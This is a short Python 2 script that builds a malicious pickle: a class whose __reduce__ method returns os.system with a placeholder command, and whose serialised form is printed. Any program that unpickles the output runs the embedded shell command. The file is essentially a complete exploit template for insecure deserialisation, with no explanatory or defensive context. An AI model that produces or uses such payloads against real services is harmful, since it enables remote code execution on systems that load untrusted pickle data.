import cPickle
import os

class Blah(object):
        def __reduce__(self):
                return (os.system,("ENTER COMMANDS HERE",))

b = Blah()

print cPickle.dumps(b)
